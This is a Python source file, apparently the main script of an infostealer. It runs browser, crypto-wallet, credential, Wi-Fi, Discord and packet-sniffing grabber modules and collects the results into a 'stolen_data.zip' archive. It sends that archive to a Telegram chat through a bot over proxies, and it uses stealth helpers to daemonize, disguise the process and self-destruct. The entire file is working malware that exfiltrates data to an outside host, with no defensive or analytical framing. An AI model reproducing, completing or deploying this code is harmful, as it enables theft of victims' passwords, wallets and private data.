import os
import sys
import tempfile
import asyncio
import zipfile
from telethon import TelegramClient
from telethon.network.connection.tcpabridged import ConnectionTcpAbridged
from src.configs import *
from src.utils.stealth import is_admin, run_as_admin, daemonize, disguise, self_destruct
from modules.browsers_grabber import Browsers
from modules.crypto_wallets import CryptoWallets
from modules.credential_thief import CredentialThief
from modules.packet_sniffer import PacketSniffer
from modules.device_info import DeviceInfo
from modules.wifi_grabber import Wifi
from modules.discord_grabber import Discord

PROXIES = [
    {
        "server": "",  # The address of the proxy server
        "port": 8080,  # The port number for the proxy
        "secret": "==",  # The secret key for authentication
        "proxy_type": "http"  # The type of proxy (http, socks5, etc.)
    }
]
temp_path = os.path.join(tempfile.gettempdir(), "BrowserData")
os.makedirs(temp_path, exist_ok=True)

async def start_client():
    """Initialize Telegram client with proxy."""
    client = None
    for proxy in PROXIES:
        try:
            client = TelegramClient(
                "session_hijacker", API_ID, API_HASH,
                proxy=(proxy["proxy_type"], proxy["server"], proxy["port"], proxy["secret"]),
                connection=ConnectionTcpAbridged
            )
            await client.start(bot_token=BOT_TOKEN)
            print("Client started")
            return client
        except Exception as e:
            print(f"Proxy failed: {e}")
            await asyncio.sleep(5)
    raise Exception("All proxies failed")

async def zip_and_send(client):
    """Zip collected data and send to Telegram."""
    zip_path = os.path.join(temp_path, "stolen_data.zip")
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(temp_path):
            for file in files:
                if file != "stolen_data.zip":
                    zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), temp_path))
    print(f"Zipped data to {zip_path}")
    with open(zip_path, "rb") as f:
        await client.send_file(CHAT_ID, f, caption="Stolen Data")
    print("Sent stolen_data.zip to Telegram")

async def main():
    """Main execution—silent, obfuscated, self-destructing."""
    if not is_admin():
        print("Not admin—full sniffing requires elevation.")
        choice = input("Relaunch as admin? (y/n): ").strip().lower()
        if choice == 'y':
            run_as_admin()
        else:
            daemonize()
            sys.executable = disguise()

    client = await start_client()
    async with client:
        browsers = Browsers(client)
        crypto_wallets = CryptoWallets(browsers)
        credential_thief = CredentialThief(browsers)
        packet_sniffer = PacketSniffer(browsers)
        device_info = DeviceInfo(browsers)
        wifi = Wifi(temp_path)
        discord = Discord(temp_path)

        await asyncio.gather(
            browsers.extract_data(),
            crypto_wallets.extract_data(),
            credential_thief.extract_data(),
            packet_sniffer.extract_data(),
            device_info.extract_data()
        )

        await zip_and_send(client)
    
    self_destruct()

if __name__ == "__main__":
    asyncio.run(main())